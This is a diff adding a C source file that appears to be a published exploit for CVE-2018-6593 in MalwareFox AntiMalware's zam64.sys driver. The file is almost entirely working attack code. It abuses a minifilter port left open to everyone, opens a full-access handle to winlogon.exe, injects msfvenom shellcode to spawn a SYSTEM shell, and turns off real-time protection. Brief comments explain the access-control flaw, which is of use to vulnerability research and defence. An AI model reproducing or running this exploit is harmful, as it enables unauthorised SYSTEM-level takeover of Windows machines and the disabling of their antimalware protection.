@@ -1,0 +1,207 @@
+/*
+Title			:	MalwareFox AntiMalware 2.74.0.150 - Local Privilege Escalation
+Date			:	02/02/2018
+Author			:	Souhail Hammou
+Vendor Homepage	:	https://www.malwarefox.com/
+Version			:	2.74.0.150
+Tested on		:	Windows 7 32-bit / Windows 10 64-bit
+CVE				:	CVE-2018-6593
+*/
+#include <Windows.h>
+#include <fltUser.h>
+#include <TlHelp32.h>
+#include <stdio.h>
+
+#pragma comment(lib,"FltLib.lib")
+
+BOOL RegisterProcessByCommunicationPort()
+{
+	HRESULT hResult;
+	HANDLE hPort;
+
+	/*
+	Improper access control :
+	The default DACL for the filter communication port is superseded allowing everyone to connect to the port:
+
+	.text:0000000140011987                 lea     rcx, [rbp+SecurityDescriptor]
+	.text:000000014001198B                 mov     edx, 1F0001h
+	.text:0000000140011990                 call    FltBuildDefaultSecurityDescriptor ;default SD only allows SYSTEM & Admins to connect
+	.text:0000000140011995                 test    eax, eax
+
+	[.........]
+
+	.text:00000001400119B1
+	.text:00000001400119B1 loc_1400119B1:                          ; CODE XREF: sub_140011890+107j
+	.text:00000001400119B1                 mov     rcx, [rbp+SecurityDescriptor] ; SecurityDescriptor
+	.text:00000001400119B5                 xor     r9d, r9d        ; DaclDefaulted
+	.text:00000001400119B8                 xor     r8d, r8d        ; Dacl
+	.text:00000001400119BB                 mov     dl, 1           ; DaclPresent
+	.text:00000001400119BD                 call    cs:RtlSetDaclSecurityDescriptor ; <= Vuln: SD's DACL pointer is set to NULL, granting access to everyone
+
+	Once connected to the port, the driver automatically registers the process
+	as trusted. This allows the process to issue IOCTL codes that couldn't be sent otherwise.
+	e.g. disable real-time protection, write to raw disk, open full access handles to processes ...etc
+	*/
+
+	hResult = FilterConnectCommunicationPort(
+		L"\\GLOBAL??\\ZAM_MiniFilter_CommPort",
+		0,
+		NULL,
+		0,
+		NULL,
+		&hPort);
+
+	if (hResult != S_OK)
+	{
+		return FALSE;
+	}
+	CloseHandle(hPort);
+	return TRUE;
+}
+
+DWORD GetWinlogonPID()
+{
+	DWORD WinlogonPid = 0;
+	PROCESSENTRY32 ProcessEntry;
+	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE)
+	{
+		printf("[-] CreateToolhelp32Snapshot failed !\n");
+		goto ret;
+	}
+
+	if (!Process32First(hSnapshot, &ProcessEntry))
+	{
+		printf("[-] Process32First failed !\n");
+		goto cleanup;
+	}
+
+	do
+	{
+		if (!lstrcmp(ProcessEntry.szExeFile, "winlogon.exe"))
+		{
+			WinlogonPid = ProcessEntry.th32ProcessID;
+			break;
+		}
+	} while (Process32Next(hSnapshot, &ProcessEntry));
+
+cleanup:
+	CloseHandle(hSnapshot);
+ret:
+	return WinlogonPid;
+}
+int main(int argc, char** argv)
+{
+	DWORD BytesReturned;
+	DWORD winlogon_pid;
+	HANDLE winlogon_handle;
+	LPVOID RemoteAllocation;
+	HANDLE hDevice;
+
+	printf("===      MalwareFox Anti-Malware 2.74.0.150 zam64.sys Local Privilege Escalation      ===\n");
+	printf("                              Tested on Windows 10 64-bit                                \n");
+	printf("                                   Souhail Hammou                                      \n\n");
+	printf("[*] Stage 1: Registering the process with the driver by connecting to the minifilter communication port\n");
+
+	hDevice = CreateFile
+		("\\\\.\\ZemanaAntiMalware",
+			GENERIC_READ | GENERIC_WRITE,
+			0,
+			NULL,
+			OPEN_EXISTING,
+			FILE_ATTRIBUTE_NORMAL,
+			NULL
+			);
+	if (hDevice == INVALID_HANDLE_VALUE)
+	{
+		return 0;
+	}
+
+
+	if (!RegisterProcessByCommunicationPort())
+	{
+		printf("\t[-] Registration Failed !\n");
+		return 0;
+	}
+
+	printf("\t[+] Process registered.\n[*] Stage 2: \n");
+
+	printf("\t[+] Getting Winlogon's PID\n");
+	winlogon_pid = GetWinlogonPID();
+
+	if (!winlogon_pid)
+	{
+		printf("\t[-] GetWinlogonPID() failed !\n");
+		return 0;
+	}
+
+	printf("\t[+] (IOCTL) Opening a full access, user-mode accessible handle from kernel-mode to winlogon\n");
+
+	/*
+	The dispatcher for IOCTL code 0x8000204C opens a full access handle, accessible from usermode, to a process.
+	We use this IOCTL to open a full access handle to winlogon.exe.
+	Note that this IOCTL can only be sent if the process is registered with the driver.
+	*/
+	if (!DeviceIoControl(hDevice, 0x8000204C, &winlogon_pid, sizeof(DWORD), &winlogon_handle, sizeof(HANDLE), &BytesReturned, NULL))
+	{
+		printf("\t[-] DeviceIoControl 0x8000204C failed !\n");
+		return 0;
+	}
+
+	printf("\t[+] Allocating executable memory in winlogon.exe using the full access handle\n");
+
+	if (!(RemoteAllocation = VirtualAllocEx(winlogon_handle, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
+	{
+		printf("\t[-] VirtualAllocEx failed !\n");
+		return 0;
+	}
+
+	printf("\t[+] Writing shellcode to allocated memory\n");
+
+	/*msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c*/
+	unsigned char buf[] =
+		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+		"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";
+
+	if (!WriteProcessMemory(winlogon_handle, RemoteAllocation, buf, sizeof(buf), &BytesReturned))
+	{
+		printf("\t[-] WriteProcessMemory Failed !\n");
+		return 0;
+	}
+
+	printf("\t[+] Spawning SYSTEM shell\n");
+	if (!CreateRemoteThread(winlogon_handle, NULL, 0, RemoteAllocation, NULL, 0, NULL))
+	{
+		printf("\t[-] CreateRemoteThread Failed! Did you compile the exploit as a 64-bit executable ?\n");
+		return 0;
+	}
+
+	printf("[*] Bonus:\n\t[+] Disabling real-time protection\n");
+	if (!DeviceIoControl(hDevice, 0x80002090, NULL, 0, NULL, 0, &BytesReturned, NULL))
+	{
+		printf("\t[-] DeviceIoControl 0x80002090 failed !\n");
+		return 0;
+	}
+	printf("\t[+] RT protection disabled.");
+	return 0;
+}
